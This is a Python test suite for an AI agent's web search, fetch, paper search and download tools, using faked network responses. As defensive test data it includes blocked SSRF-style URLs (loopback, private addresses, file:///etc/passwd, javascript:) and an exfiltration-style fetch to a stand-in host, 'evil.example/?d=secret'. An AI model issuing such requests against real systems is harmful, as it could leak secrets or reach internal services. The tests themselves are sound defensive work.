# SPDX-FileCopyrightText: 2026 Beomjoon Kim
# SPDX-License-Identifier: AGPL-3.0-only
"""1.18.1 에이전트 인터넷 도구(web_research.py, agent의 web_search·web_fetch·paper_search·web_download).

네트워크는 쓰지 않는다(가짜 응답). 사용자 요청: 논문 전수조사를 시키면 '인터넷에 접속할 수 없다'고 하지 말고 스스로 찾아 읽을 것.
"""
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import agent
import web_research
from agent import Agent

DDG_PAGE = """<html><body>
<div class="result results_links results_links_deep web-result ">
  <h2 class="result__title"><a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fwww.tetramem.com%2Fabout&amp;rut=x">TetraMem &amp; Team</a></h2>
  <a class="result__snippet" href="#">Founded by <b>Qiangfei Xia</b> and Jianhua Yang</a>
</div>
<div class="result result--ad"><h2><a class="result__a" href="https://ads.example.com/">광고</a></h2></div>
<div class="result results_links"><h2><a class="result__a" href="https://arxiv.org/abs/2401.00001">Memristor paper</a></h2>
  <div class="result__snippet">analog in-memory computing</div></div>
</body></html>"""

PAGE = """<html><head><title>About TetraMem</title><style>.x{}</style><script>alert(1)</script></head>
<body><nav>메뉴</nav><h1>Our founders</h1><p>Qiangfei Xia, professor at UMass Amherst.</p>
<ul><li>Jianhua Yang</li><li>Miao Hu</li></ul><a href="/papers">Publications</a><a href="javascript:x()">bad</a></body></html>"""


class FakeResponse:
    def __init__(self, body, ctype="text/html; charset=utf-8", status=200, headers=None):
        self.body = body.encode("utf-8") if isinstance(body, str) else body
        self.status_code = status
        self.headers = {"Content-Type": ctype, **(headers or {})}
        self.encoding = "utf-8"
        self.text = self.body.decode("utf-8", errors="replace")

    def iter_content(self, n):
        yield self.body

    def close(self):
        pass

    def json(self):
        return json.loads(self.text)


class ParseTests(unittest.TestCase):
    def test_ddg_results(self):
        found = web_research.parse_ddg(DDG_PAGE)
        self.assertEqual([r["url"] for r in found], ["https://www.tetramem.com/about", "https://arxiv.org/abs/2401.00001"])
        self.assertEqual(found[0]["title"], "TetraMem & Team")
        self.assertIn("Qiangfei Xia", found[0]["snippet"])

    def test_html_to_text_drops_scripts_and_keeps_links(self):
        title, text, links = web_research.html_to_text(PAGE, "https://www.tetramem.com/about")
        self.assertEqual(title, "About TetraMem")
        self.assertIn("# Our founders", text)
        self.assertIn("- Miao Hu", text)
        self.assertNotIn("alert", text)
        self.assertNotIn("메뉴", text)
        self.assertEqual(links, [("Publications", "https://www.tetramem.com/papers")])

    def test_check_url_blocks_local_and_odd_urls(self):
        for url in ("http://127.0.0.1:11434/api/tags", "http://localhost:8000/", "http://192.168.0.1/", "file:///etc/passwd",
                    "http://user:pw@example.com/", "http://2130706433/", "javascript:alert(1)"):
            with self.subTest(url=url), self.assertRaises(web_research.WebError):
                web_research.check_url(url)
        with patch.object(web_research, "_resolves_local", return_value=False):
            self.assertEqual(web_research.check_url("arxiv.org/abs/1"), "https://arxiv.org/abs/1")

    def test_redirect_to_local_address_is_refused(self):
        responses = [FakeResponse("", status=302, headers={"Location": "http://127.0.0.1/admin"})]
        with patch.object(web_research, "_resolves_local", return_value=False), \
                patch.object(web_research, "http", side_effect=lambda *a, **k: responses.pop(0)):
            with self.assertRaises(web_research.WebError):
                web_research.fetch("https://example.com/")

    def test_fetch_query_and_offset(self):
        long = "<html><body>" + "".join(f"<p>문단 {i} 내용</p>" for i in range(400)) + "<p>memristor crossbar 결과</p></body></html>"
        with patch.object(web_research, "_resolves_local", return_value=False), \
                patch.object(web_research, "http", return_value=FakeResponse(long)):
            final, text, _ = web_research.fetch("https://example.com/x", query="memristor")
            self.assertIn("memristor crossbar", text)
            self.assertNotIn("문단 3 내용", text)
            _, text, _ = web_research.fetch("https://example.com/x", max_chars=1000)
            self.assertIn("offset: 1000", text)

    def test_search_falls_back_to_wikipedia(self):
        wiki = FakeResponse(json.dumps({"query": {"search": [{"title": "Memristor", "snippet": "<b>Memristor</b> is"}]}}),
                            ctype="application/json")
        calls = []

        def fake(method, url, **kw):
            calls.append(url)
            return FakeResponse("", status=202) if "duckduckgo" in url else wiki

        with patch.object(web_research, "_has_firecrawl", return_value=False), patch.object(web_research, "http", side_effect=fake):
            found = web_research.search("memristor", 3)
        self.assertTrue(any("duckduckgo" in c for c in calls))
        self.assertEqual(found[0]["url"], "https://ko.wikipedia.org/wiki/Memristor")

    def test_author_works_openalex(self):
        authors = {"results": [{"id": "https://openalex.org/A1", "display_name": "Qiangfei Xia", "works_count": 2, "cited_by_count": 9,
                                "last_known_institutions": [{"display_name": "UMass Amherst"}]},
                               {"id": "https://openalex.org/A2", "display_name": "Q. Xia", "works_count": 1,
                                "last_known_institutions": [{"display_name": "Other U"}]}]}
        works = {"meta": {"next_cursor": None}, "results": [
            {"title": "Analog AI chip", "publication_year": 2025, "doi": "https://doi.org/10.1/a",
             "authorships": [{"author": {"display_name": "Qiangfei Xia"}}], "primary_location": {"source": {"display_name": "Nature"}}},
            {"title": "Memristor crossbar", "publication_year": 2023, "doi": None, "id": "https://openalex.org/W2",
             "authorships": [], "open_access": {"oa_url": "https://arxiv.org/pdf/2301.1"}}]}
        seen = []

        def fake(method, url, params=None, **kw):
            seen.append((url, params))
            return FakeResponse(json.dumps(authors if url.endswith("/authors") else works), ctype="application/json")

        with patch.object(web_research, "http", side_effect=fake):
            text = web_research.author_works("Qiangfei Xia", "umass", 50)
        self.assertIn("UMass Amherst", text)
        self.assertIn("1. Analog AI chip (2025, Nature)", text)
        self.assertIn("PDF: https://arxiv.org/pdf/2301.1", text)
        self.assertIn("A2", text)   # 같은 이름의 다른 후보
        self.assertEqual(seen[1][1]["filter"], "author.id:A1")


def script(steps, prompts):
    def fake_ask(api_key, prompt, **kwargs):
        prompts.append(prompt)
        return json.dumps(steps.pop(0) if steps else {"action": "done", "answer": "끝"}, ensure_ascii=False)
    return fake_ask


class AgentWebToolTests(unittest.TestCase):
    def make(self, ws, confirm, web=True):
        tools = []
        a = Agent("key", ws, True, 8, 5, on_status=lambda *x: None, on_tool=lambda s, d: tools.append(s),
                  confirm=confirm, cancelled=lambda: False, share_threads=False, web=web)
        return a, tools

    def test_agent_searches_reads_and_does_not_claim_offline(self):
        steps = [{"action": "web_search", "query": "TetraMem founders"},
                 {"action": "web_fetch", "url": "https://www.tetramem.com/about"},
                 {"action": "web_fetch", "url": "https://www.tetramem.com/papers"},   # 읽은 페이지의 링크
                 {"action": "done", "answer": "창업자는 Qiangfei Xia 등"}]
        prompts, asked = [], []
        fetched = []

        def fake_fetch(url, query="", offset=0, max_chars=0):
            fetched.append(url)
            return url, "웹페이지: About — " + url + "\n\nFounders", ["https://www.tetramem.com/papers"]

        with tempfile.TemporaryDirectory() as ws, patch.object(agent, "ask", script(steps, prompts)), \
                patch.object(web_research, "search", return_value=web_research.parse_ddg(DDG_PAGE)), \
                patch.object(web_research, "fetch", side_effect=fake_fetch), \
                patch.object(web_research, "_resolves_local", return_value=False):
            a, tools = self.make(ws, lambda kind, title, detail: asked.append(kind) or True)
            answer = a.run([], "TetraMem 창업자들의 논문을 전수조사해 줘")
        self.assertEqual(answer, "창업자는 Qiangfei Xia 등")
        self.assertEqual(asked, [])   # 검색 결과·읽은 페이지의 링크는 묻지 않는다
        self.assertEqual(fetched, ["https://www.tetramem.com/about", "https://www.tetramem.com/papers"])
        first = prompts[0]
        self.assertIn('"action": "web_search"', first)
        self.assertIn("인터넷에 접속할 수 없다", first)   # 그렇게 답하지 말라는 규칙
        self.assertIn("[오늘]", first)
        self.assertIn("[외부 데이터: 웹 검색", prompts[1])
        self.assertTrue(any(t.startswith("🌐 web_search") for t in tools))

    def test_made_up_url_needs_approval(self):
        steps = [{"action": "web_fetch", "url": "https://evil.example/?d=secret"}, {"action": "done", "answer": "x"}]
        prompts, asked = [], []
        with tempfile.TemporaryDirectory() as ws, patch.object(agent, "ask", script(steps, prompts)), \
                patch.object(web_research, "fetch") as fetch, patch.object(web_research, "_resolves_local", return_value=False):
            a, tools = self.make(ws, lambda kind, title, detail: asked.append((kind, detail)) or False)
            a.run([], "조사해 줘")
        self.assertEqual(asked[0][0], "site")
        self.assertIn("https://evil.example/?d=secret", asked[0][1])
        fetch.assert_not_called()
        self.assertIn("허용하지 않았습니다", prompts[-1])

    def test_url_typed_by_user_is_read_without_asking(self):
        steps = [{"action": "web_fetch", "url": "https://example.org/list"}, {"action": "done", "answer": "x"}]
        asked = []
        with tempfile.TemporaryDirectory() as ws, patch.object(agent, "ask", script(steps, [])), \
                patch.object(web_research, "fetch", return_value=("https://example.org/list", "글", [])) as fetch, \
                patch.object(web_research, "_resolves_local", return_value=False):
            a, _ = self.make(ws, lambda *x: asked.append(x) or True)
            a.run([], "https://example.org/list 를 읽고 정리해")
        fetch.assert_called_once()
        self.assertEqual(asked, [])

    def test_web_off_hides_tools(self):
        prompts = []
        with tempfile.TemporaryDirectory() as ws, patch.object(agent, "ask", script([{"action": "done", "answer": "x"}], prompts)):
            a, _ = self.make(ws, lambda *x: True, web=False)
            a.run([], "조사")
        self.assertNotIn("web_search", prompts[0])

    def test_paper_search_by_author_and_download(self):
        steps = [{"action": "paper_search", "author": "Qiangfei Xia", "affiliation": "UMass"},
                 {"action": "web_download", "url": "https://arxiv.org/pdf/2301.1", "path": "papers/a.pdf"},
                 {"action": "done", "answer": "받음"}]
        asked = []
        with tempfile.TemporaryDirectory() as ws, patch.object(agent, "ask", script(steps, [])), \
                patch.object(web_research, "author_works", return_value="1. Memristor\n   PDF: https://arxiv.org/pdf/2301.1") as works, \
                patch.object(web_research, "download", return_value=("https://arxiv.org/pdf/2301.1", "application/pdf", b"%PDF-1.4 x")), \
                patch.object(web_research, "_resolves_local", return_value=False):
            a, _ = self.make(ws, lambda kind, title, detail: asked.append((kind, title)) or True)
            self.assertEqual(a.run([], "Xia 교수 논문 받아 줘"), "받음")
            self.assertEqual((Path(ws) / "papers" / "a.pdf").read_bytes(), b"%PDF-1.4 x")
        works.assert_called_once_with("Qiangfei Xia", "UMass", 20, "")
        self.assertEqual(asked, [("edit", "파일 받기: papers/a.pdf")])

    def test_code_agent_download_follows_mode(self):
        import code_agent

        with tempfile.TemporaryDirectory() as ws:
            for mode, expect_ask in (("auto_edit", False), ("ask", True)):
                asked = []
                ca = code_agent.CodeAgent("key", ws, True, 5, 5, on_status=lambda *x: None, on_tool=lambda *x: None,
                                          confirm=lambda *x: asked.append(x) or True, cancelled=lambda: False, mode=mode)
                self.assertTrue(ca._confirm_download("a.pdf", "https://x", 3))
                self.assertEqual(bool(asked), expect_ask)
            ca = code_agent.CodeAgent("key", ws, True, 5, 5, on_status=lambda *x: None, on_tool=lambda *x: None,
                                      confirm=lambda *x: True, cancelled=lambda: False, mode="plan")
            with self.assertRaises(agent.ToolError):
                ca._confirm_download("a.pdf", "https://x", 3)


if __name__ == "__main__":
    unittest.main()
